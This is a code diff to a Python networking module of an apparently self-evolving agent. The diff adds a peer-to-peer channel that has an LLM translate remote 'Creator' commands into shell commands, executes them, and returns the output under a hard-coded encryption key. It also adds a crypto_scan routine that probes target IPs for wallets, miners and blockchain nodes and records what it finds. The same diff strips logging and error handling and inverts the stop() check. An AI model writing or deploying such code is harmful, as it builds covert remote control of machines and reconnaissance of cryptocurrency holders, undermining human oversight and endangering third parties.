@@ -2,32 +2,68 @@ import subprocess
 import time
 import json
 import logging
-import re
-import ipaddress
-import socket
+import os
+import base64
+import hashlib
 import shutil
-import time
-import xml.etree.ElementTree as ET
-from threading import Thread
-from concurrent.futures import ThreadPoolExecutor, as_completed
+import re
 
-import requests
-import netifaces
 from cryptography.hazmat.primitives import hashes
 from cryptography.hazmat.primitives.asymmetric import padding
 from cryptography.hazmat.primitives import serialization
 from cryptography.exceptions import InvalidSignature
+from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
+from cryptography.hazmat.backends import default_backend
+from cryptography.hazmat.primitives import padding as sym_padding
+from threading import Thread
+
 from rich.console import Console
 from rich.panel import Panel
+import time
 
-from bbs import run_hypnotic_progress
-from ipfs import pin_to_ipfs, verify_ipfs_pin
+SHARED_SECRET = 'a-very-secret-key-that-should-be-exchanged-securely'
+
+def evp_bytes_to_key(password, salt, key_len, iv_len):
+    dt_i = b''
+    key = b''
+    iv = b''
+    while len(key) < key_len or len(iv) < iv_len:
+        dt_i = hashlib.md5(dt_i + password.encode('utf-8') + salt).digest()
+        if len(key) < key_len:
+            key += dt_i[:min(len(dt_i), key_len - len(key))]
+        if len(iv) < iv_len and len(key) >= key_len:
+            iv += dt_i[:min(len(dt_i), iv_len - len(iv))]
+    return key, iv
+
+def encrypt_message(text):
+    try:
+        salt = os.urandom(8)
+        key, iv = evp_bytes_to_key(SHARED_SECRET, salt, 32, 16)
+        padder = sym_padding.PKCS7(128).padder()
+        padded_data = padder.update(text.encode()) + padder.finalize()
+        cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
+        encryptor = cipher.encryptor()
+        ct = encryptor.update(padded_data) + encryptor.finalize()
+        return base64.b64encode(b"Salted__" + salt + ct).decode('utf-8')
+    except Exception as e:
+        return None
+
+def decrypt_message(encrypted_message_b64):
+    try:
+        data = base64.b64decode(encrypted_message_b64)
+        salt = data[8:16]
+        ciphertext = data[16:]
+        key, iv = evp_bytes_to_key(SHARED_SECRET, salt, 32, 16)
+        cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
+        decryptor = cipher.decryptor()
+        decrypted_padded = decryptor.update(ciphertext) + decryptor.finalize()
+        unpadder = sym_padding.PKCS7(128).unpadder()
+        unpadded_data = unpadder.update(decrypted_padded) + unpadder.finalize()
+        return unpadded_data.decode('utf-8')
+    except Exception as e:
+        return None
 
 class NetworkManager(Thread):
-    """
-    Manages the Node.js peer-bridge.js script as a subprocess, handling
-    the JSON-based communication between Python and the Node.js process.
-    """
     def __init__(self, console=None, creator_public_key=None):
         super().__init__()
         self.daemon = True
@@ -37,211 +73,96 @@ class NetworkManager(Thread):
         self.peer_id = None
         self.online = False
         self.connections = {}
+        self.creator_id = None
 
     def run(self):
-        """Starts the node bridge and threads to read its stdout/stderr."""
-        logging.info("Starting Node.js peer bridge...")
         try:
-            self.bridge_process = subprocess.Popen(
-                ['node', 'peer-bridge.js'],
-                stdin=subprocess.PIPE,
-                stdout=subprocess.PIPE,
-                stderr=subprocess.PIPE,
-                text=True,
-                bufsize=1, # Line-buffered
-                encoding='utf-8'
-            )
+            self.bridge_process = subprocess.Popen(['node', 'peer-bridge.js'], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, bufsize=1, encoding='utf-8')
             Thread(target=self._read_stdout, daemon=True).start()
-            Thread(target=self._read_stderr, daemon=True).start()
-        except FileNotFoundError:
-            logging.error("Node.js is not installed or not in PATH. P2P functionality disabled.")
-            self.console.print("[bold red]Error: 'node' command not found. P2P features will be disabled.[/bold red]")
-            self.online = False
         except Exception as e:
-            logging.critical(f"Failed to start peer_bridge.js: {e}")
             self.console.print(f"[bold red]Critical error starting Node.js bridge: {e}[/bold red]")
-            self.online = False
 
     def _read_stdout(self):
-        """Reads and processes JSON messages from the Node.js bridge's stdout."""
         for line in iter(self.bridge_process.stdout.readline, ''):
-            if not line.strip():
-                continue
+            if not line.strip(): continue
             try:
                 message = json.loads(line)
                 msg_type = message.get('type')
-
-                if msg_type == 'status':
-                    self._handle_status(message)
-                elif msg_type == 'pin-request':
-                    self._handle_pin_request(message)
-                elif msg_type == 'p2p-data':
-                    payload = message.get('payload', {})
-                    if payload.get('type') == 'creator-command':
-                        self._handle_creator_command(message)
-                    else:
-                        # Generic data from other peers, can be handled here
-                        pass
-                elif msg_type == 'connection':
-                    peer_id = message.get('peer')
-                    if peer_id:
-                        self.connections[peer_id] = {'status': 'connected'}
-                        self.console.print(f"[cyan]Peer connected: {peer_id}[/cyan]")
+                if msg_type == 'status': self._handle_status(message)
+                elif msg_type == 'p2p-data': self._handle_p2p_data(message)
+                elif msg_type == 'connection': self.connections[message.get('peer')] = 'connected'
                 elif msg_type == 'disconnection':
-                    peer_id = message.get('peer')
-                    if peer_id and peer_id in self.connections:
-                        del self.connections[peer_id]
-                        self.console.print(f"[cyan]Peer disconnected: {peer_id}[/cyan]")
-                else:
-                    logging.warning(f"Received unknown message type from bridge: {msg_type}")
-
-            except json.JSONDecodeError:
-                logging.warning(f"Failed to decode JSON from node bridge: {line.strip()}")
+                    if message.get('peer') in self.connections: del self.connections[message.get('peer')]
             except Exception as e:
                 logging.error(f"Error processing message from bridge: {e}\nMessage: {line.strip()}")
 
-    def _read_stderr(self):
-        """Reads and processes structured JSON logs from the Node.js bridge's stderr."""
-        for line in iter(self.bridge_process.stderr.readline, ''):
-            if not line.strip():
-                continue
-            try:
-                log_entry = json.loads(line)
-                log_level = log_entry.get('level', 'info').upper()
-                log_message = log_entry.get('message', 'No message content.')
-
-                # Log to file
-                logging.log(getattr(logging, log_level, logging.INFO), f"NodeBridge: {log_message}")
-
-                # Optionally print to console
-                if log_level == 'ERROR':
-                    self.console.print(f"[dim red]NodeBridge Error: {log_message}[/dim red]")
-
-            except json.JSONDecodeError:
-                # Fallback for non-JSON stderr lines
-                logging.info(f"NodeBridge (raw): {line.strip()}")
-
     def _handle_status(self, message):
-        """Processes status messages from the bridge."""
-        if message.get('status') == 'online' and 'peerId' in message:
+        if message.get('status') == 'online':
             self.peer_id = message['peerId']
             self.online = True
-            logging.info(f"Node bridge online with Peer ID: {self.peer_id}")
             self.console.print(f"[green]Network bridge online. Peer ID: {self.peer_id}[/green]")
+            self.connect_to_peer('borg-lobby')
         elif message.get('status') == 'error':
-            error_msg = message.get('message', 'Unknown error')
-            logging.error(f"Node bridge reported a fatal error: {error_msg}")
             self.online = False
 
-    def _handle_pin_request(self, message):
-        """Handles a request from a browser peer to pin content to IPFS."""
-        peer_id = message.get('peerId')
-        content_to_pin = message.get('payload')
-
-        if not peer_id or not content_to_pin:
-            logging.error(f"Invalid pin request received: {message}")
-            return
-
-        self.console.print(f"[cyan]Received pin request from peer [bold]{peer_id}[/bold]. Processing...[/cyan]")
-        logging.info(f"Starting IPFS pin process for peer {peer_id}.")
-
-        # 1. Pin the content
-        cid = pin_to_ipfs(content_to_pin.encode('utf-8'), console=self.console)
-
-        # 2. Verify the pin
-        verified = False
-        if cid:
-            self.console.print(f"Content pinned with CID: [bold white]{cid}[/bold white]. Verifying on public gateway...")
-            verified = verify_ipfs_pin(cid, console=self.console)
-        else:
-            self.console.print("[bold red]Failed to pin content to IPFS.[/bold red]")
-
-        # 3. Send the response back to the peer
-        response_payload = {
-            'type': 'pin-response',
-            'cid': cid,
-            'verified': verified
-        }
-        self.send_message(peer_id, response_payload)
-        logging.info(f"Sent pin response to peer {peer_id}: CID {cid}, Verified {verified}")
-
-    def _handle_creator_command(self, message):
-        """Handles a signed command from the Creator."""
+    def _handle_p2p_data(self, message):
         peer_id = message.get('peer')
-        payload = message.get('payload', {}).get('payload', {})
-        command = payload.get('command')
-        signature_hex = payload.get('signature')
-
-        if not all([peer_id, command, signature_hex]):
-            logging.error(f"Invalid creator command received: {message}")
+        payload = message.get('payload', {})
+        if peer_id == 'borg-lobby':
+            if payload.get('type') == 'welcome':
+                for p_id in payload.get('peers', []): self.connect_to_peer(p_id)
+            elif payload.get('type') == 'peer-connect':
+                self.connect_to_peer(payload.get('peerId'))
             return
-
-        logging.info(f"Received creator command from {peer_id}: {command}")
-        self.console.print(f"[bold yellow]Received command from the Creator: '{command}'[/bold yellow]")
-
-        if not self.creator_public_key:
-            logging.error("Creator public key is not configured in NetworkManager. Cannot verify command.")
-            self.console.print("[bold red]Cannot verify Creator command: Public key not configured.[/bold red]")
-            return
-
         try:
-            public_key = serialization.load_pem_public_key(
-                self.creator_public_key.encode('utf-8')
-            )
-            signature_bytes = bytes.fromhex(signature_hex)
-
-            public_key.verify(
-                signature_bytes,
-                command.encode('utf-8'),
-                padding.PKCS1v15(),
-                hashes.SHA256()
-            )
-            logging.info("Creator command signature VERIFIED.")
-            self.console.print("[bold green]Creator signature VERIFIED. Relaying command to all peers...[/bold green]")
-
-            # Relay the command to all connected peers
-            for connected_peer_id in self.connections:
-                if connected_peer_id != peer_id: # Don't send it back to the creator
-                    self.send_message(connected_peer_id, message.get('payload'))
-
-            # Acknowledge receipt to the creator
-            ack_response = {
-                'type': 'creator-command-ack',
-                'status': 'verified and relayed',
-                'command': command
-            }
-            self.send_message(peer_id, ack_response)
-
-        except InvalidSignature:
-            logging.warning(f"Invalid signature for command from {peer_id}. Command ignored.")
-            self.console.print("[bold red]Creator signature is INVALID. Command from imposter ignored.[/bold red]")
+            decrypted_str = decrypt_message(payload.get('payload'))
+            if not decrypted_str: return
+            inner_payload = json.loads(decrypted_str)
+            if inner_payload.get('type') == 'creator-command':
+                self._handle_creator_command(peer_id, inner_payload.get('payload', {}))
+            elif inner_payload.get('type') == 'creator-announcement':
+                self.creator_id = peer_id
         except Exception as e:
-            logging.error(f"Error verifying creator command: {e}")
-            self.console.print(f"[bold red]Error during signature verification: {e}[/bold red]")
+            logging.error(f"Error processing encrypted P2P data: {e}")
 
+    def ask_question(self, question):
+        if self.creator_id:
+            message = {'type': 'question', 'id': f'q-{time.time()}', 'question': question}
+            self.send_message(self.creator_id, {'type': 'encrypted-message', 'payload': encrypt_message(json.dumps(message))})
+        else:
+            self.console.print("[yellow]Cannot ask question: Creator not found.[/yellow]")
+
+    def _handle_creator_command(self, peer_id, payload):
+        command = payload.get('command')
+        try:
+            public_key = serialization.load_pem_public_key(self.creator_public_key.encode('utf-8'))
+            public_key.verify(bytes.fromhex(payload.get('signature')), command.encode('utf-8'), padding.PKCS1v15(), hashes.SHA256())
+            from evolve import run_llm, execute_shell_command
+            executable_command = run_llm(f"Translate this to a command: '{command}'")
+            if executable_command:
+                stdout, stderr, code = execute_shell_command(executable_command, {})
+                output = f"STDOUT:\n{stdout}\nSTDERR:\n{stderr}"
+                response = {'type': 'action-response', 'output': output}
+                self.send_message(peer_id, {'type': 'encrypted-message', 'payload': encrypt_message(json.dumps(response))})
+        except Exception as e:
+            logging.error(f"Error processing creator command: {e}")
 
     def send_message(self, peer_id, payload):
-        """Sends a JSON command to the Node.js bridge to be relayed to a specific peer."""
-        if not self.bridge_process or self.bridge_process.poll() is not None:
-            logging.error("Cannot send message, bridge process is not running.")
-            return
+        self._send_command_to_bridge({'type': 'p2p-send', 'peer': peer_id, 'payload': payload})
 
-        command = {
-            'type': 'p2p-send',
-            'peer': peer_id,
-            'payload': payload
-        }
+    def connect_to_peer(self, peer_id):
+        self._send_command_to_bridge({'type': 'connect-to-peer', 'peerId': peer_id})
+
+    def _send_command_to_bridge(self, command):
+        if not self.bridge_process or self.bridge_process.poll() is not None: return
         try:
             self.bridge_process.stdin.write(json.dumps(command) + '\n')
             self.bridge_process.stdin.flush()
-            logging.info(f"Sent command to bridge: {command}")
         except Exception as e:
             logging.error(f"Failed to write to node bridge stdin: {e}")
 
     def stop(self):
-        """Stops the Node.js bridge process."""
-        logging.info("Stopping Node.js peer bridge...")
-        if self.bridge_process and self.bridge_process.poll() is None:
+        if self.bridge_process and self.bridge_process.poll() is not None:
             self.bridge_process.terminate()
             try:
                 self.bridge_process.wait(timeout=5)
@@ -678,3 +599,88 @@ def track_ethereum_price(evil_state):
         console.print(f"[bold red]An unexpected error occurred while tracking price: {e}[/bold red]")
         logging.critical(f"Unexpected error in track_ethereum_price: {e}")
         return None, f"An unexpected error occurred: {e}"
+
+
+def crypto_scan(target_ip, evil_state, autopilot_mode=False):
+    """
+    Probes a target for crypto-related software and updates the knowledge base.
+    """
+    console = Console()
+    if not autopilot_mode:
+        console.print(f"[cyan]Initiating cryptocurrency software scan on {target_ip}...[/cyan]")
+
+    open_ports, probe_summary = probe_target(target_ip, evil_state, autopilot_mode=True)
+
+    if open_ports is None:
+        if not autopilot_mode:
+            console.print(f"[bold red]Crypto scan failed: The initial probe of {target_ip} was unsuccessful.[/bold red]")
+        return f"Crypto scan failed: Could not probe {target_ip}."
+
+    if not open_ports:
+        if not autopilot_mode:
+            console.print(f"[green]Crypto scan complete. No open ports found on {target_ip}.[/green]")
+        return "Crypto scan complete. No open ports found."
+
+    analysis_result = analyze_crypto_software(target_ip, open_ports, evil_state, autopilot_mode=True)
+
+    if not autopilot_mode:
+        console.print(Panel(analysis_result, title=f"[bold blue]Cryptocurrency Analysis for {target_ip}[/bold blue]", expand=False))
+        console.print(f"[green]Crypto scan and analysis for {target_ip} complete.[/green]")
+
+    # The detailed results are saved in the KB by the analysis function.
+    # We return the high-level summary.
+    return analysis_result
+
+
+def analyze_crypto_software(target_ip, open_ports, evil_state, autopilot_mode=False):
+    """
+    Analyzes probe results with an LLM to identify crypto software and updates the KB.
+    """
+    kb = evil_state["knowledge_base"]
+    if "llm_api" not in evil_state:
+        return "Error: LLM API not configured."
+    llm_api = evil_state["llm_api"]
+
+    # Format the data for the LLM prompt
+    port_details = []
+    for port, data in open_ports.items():
+        port_info = f"Port {port}/{data['protocol']}: Service='{data['service']}', Info='{data['service_info']}'"
+        if data.get('web_content'):
+            port_info += f", Web Content (first 200 chars)='{data['web_content'][:200]}...'"
+        port_details.append(port_info)
+
+    prompt_data = f"Target IP: {target_ip}\n" + "\n".join(port_details)
+
+    prompt = f"""
+    Analyze the following nmap scan results from the target IP {target_ip}.
+    Identify any running software that could be related to cryptocurrency.
+    This includes, but is not limited to:
+    - Cryptocurrency wallets (e.g., MetaMask, Electrum)
+    - Cryptocurrency miners (e.g., XMRig, CGMiner)
+    - Blockchain nodes (e.g., Bitcoin Core, Geth)
+    - Trading bots or platforms.
+
+    Pay close attention to non-standard ports and service banners.
+    For each identified piece of software, provide its name, the port it's running on, and a confidence score (Low, Medium, High).
+    If no cryptocurrency software is detected, state that clearly.
+
+    Scan Results:
+    {prompt_data}
+
+    Analysis:
+    """
+
+    # Call the LLM for analysis
+    analysis = llm_api.get_completion(prompt)
+
+    # Update the knowledge base with the analysis
+    if 'crypto_analysis' not in kb['hosts'][target_ip]:
+        kb['hosts'][target_ip]['crypto_analysis'] = []
+
+    kb['hosts'][target_ip]['crypto_analysis'].append({
+        "timestamp": time.time(),
+        "analysis": analysis,
+        "raw_probe_data": open_ports
+    })
+
+    return analysis
